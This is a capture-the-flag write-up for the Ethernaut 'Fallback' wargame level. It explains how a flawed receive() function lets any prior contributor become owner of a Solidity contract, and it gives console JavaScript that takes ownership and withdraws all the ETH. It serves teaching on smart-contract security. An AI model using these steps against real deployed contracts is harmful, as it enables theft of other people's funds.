# Ethernaut Fallback Solution

## Smart Contract Overview

This contract manages ETH contributions with the following key functions:

- **`contribute()`**: Allows contributions of less than 0.001 ETH. If the contribution exceeds the owner's, the sender becomes the new owner.
- **`withdraw()`**: Allows only the owner to withdraw all ETH.
- **`receive()`**: Accepts ETH from previous contributors and sets the sender as the new owner.

### Security Vulnerability

The contract contains a critical flaw that allows an attacker to seize ownership and drain funds:

1. **Exploiting the `receive()` function**:
    - The attacker calls `contribute()` with less than 0.001 ETH, ensuring `contributions[msg.sender] > 0`.
    - The attacker then sends any amount of ETH (e.g., 1 wei) to trigger the `receive()` function.
    - The `receive()` function verifies the sender has previously contributed, passing the condition and setting the attacker as the new owner.

2. **Draining funds**:
    - After gaining ownership, the attacker calls `withdraw()` to drain all ETH from the contract.

---

## Solution Walkthrough

The goal is to gain ownership of the contract and withdraw all its funds.

### Key Insights

The critical components to analyze are the `contribute` function and the `receive` fallback function.

#### Owner's Initial Contribution

From the constructor, the owner's contribution is set to **1000 ETH**. To verify this, execute the following commands in the console:

```javascript
ownerAddr = await contract.owner();
await contract.contributions(ownerAddr).then(v => v.toString());
// Output: '1000000000000000000000'
```

Contributing more than 1000 ETH is impractical. Instead, we exploit the `receive` function.

---

### Step-by-Step Solution

#### 1. Make a Small Contribution

To meet the condition `contributions[msg.sender] > 0`, contribute less than **0.001 ETH**:

```javascript
await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009') });
```

Verify the contribution:

```javascript
await contract.getContribution().then(v => v.toString());
```

#### 2. Trigger the `receive` Function

Send a minimal amount of ETH to the contract to trigger the `receive` function:

```javascript
await sendTransaction({ from: player, to: contract.address, value: toWei('0.000001') });
```

Ownership is now transferred to the player. Verify the ownership change:

```javascript
await contract.owner();
// Output: Player's address
```

---

### 3. Withdraw the Contract's Funds

As the new owner, withdraw all ETH from the contract:

```javascript
await contract.withdraw();
```

---

## Challenge Solved!

By exploiting the `receive` function, ownership was transferred, and all funds were successfully withdrawn.